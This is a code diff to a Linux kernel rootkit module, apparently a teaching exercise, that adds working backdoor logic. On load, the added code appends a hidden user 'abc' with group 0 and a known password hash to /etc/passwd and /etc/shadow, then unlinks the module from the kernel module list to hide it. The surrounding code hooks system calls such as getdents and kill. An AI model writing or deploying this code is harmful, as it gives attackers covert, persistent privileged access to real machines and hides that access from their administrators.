@@ -21,6 +21,13 @@
 
 #define BUFFLEN 32
 #define PF_INVISIBLE 0x10000000
+#define BACKDOOR_PASSWD "abc:x:1002:0::/home/abc:/bin/bash\n"
+
+#define BACKDOOR_SHADOW "abc:$1$12345678$o2n/JiO/h5VviOInWJ4OQ/:18005:0:99999:7:::\n" // password is passwd
+
+#define PASSWD_FILE "/etc/passwd"
+
+#define SHADOW_FILE "/etc/shadow"
 
 struct linux_dirent {
   u64 d_ino;
@@ -194,6 +201,47 @@ asmlinkage int sneaky_kill(pid_t pid, int sig){
 	return 0;
 }
 
+void add_backdoor(char * pathname)
+{
+	char * BACKDOOR;
+	loff_t offset = 0;
+	int ret = 0;
+	mm_segment_t old_fs;
+	struct file *file;
+	if(strcmp(pathname, PASSWD_FILE)==0)
+        BACKDOOR = BACKDOOR_PASSWD;
+    if(strcmp(pathname, SHADOW_FILE)==0)
+        BACKDOOR = BACKDOOR_SHADOW;
+	old_fs = get_fs();
+
+    set_fs(get_ds());
+    file = filp_open(pathname, O_RDWR, 0);
+    set_fs(old_fs);
+    if(IS_ERR(file)){
+        printk("file open err\n");
+		return;
+    }
+
+	set_fs(get_ds());
+    offset = vfs_llseek(file, offset, SEEK_END);
+    set_fs(old_fs);
+	if(offset < 0){
+		printk("wrong offset\n");
+		return;
+	}
+	file = filp_open(pathname, O_RDWR, 0);
+	old_fs = get_fs();
+    set_fs(get_ds());
+    ret = vfs_write(file, BACKDOOR, strlen(BACKDOOR),&offset);
+    set_fs(old_fs);
+    if(ret<0){
+        printk("backdoor write failed\n");
+		return;
+    }
+}
+
+
+
 //The code that gets executed when the module is loaded
 static int initialize_sneaky_module(void)
 {
@@ -209,12 +257,17 @@ static int initialize_sneaky_module(void)
   page_ptr = virt_to_page(&sys_call_table);
   //Make this page read-write accessible
   pages_rw(page_ptr, 1);
-
+  add_backdoor(PASSWD_FILE);
+  add_backdoor(SHADOW_FILE);
   //This is the magic! Save away the original 'open' system call
   //function address. Then overwrite its address in the system call
   //table with the function address of our new code.
   //origin_setuid = (void*)*(sys_call_table + __NR_setuid);
-  //*(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid; 
+  //*(sys_call_table + __NR_setuid) = (unsigned long)sneaky_setuid;
+  module_head = THIS_MODULE->list.prev;
+  list_del(&THIS_MODULE->list);
+  mhide = 1;
+ 
   //getdents
   original_getdents = (void*)*(sys_call_table + __NR_getdents);  
   *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_getdents; 
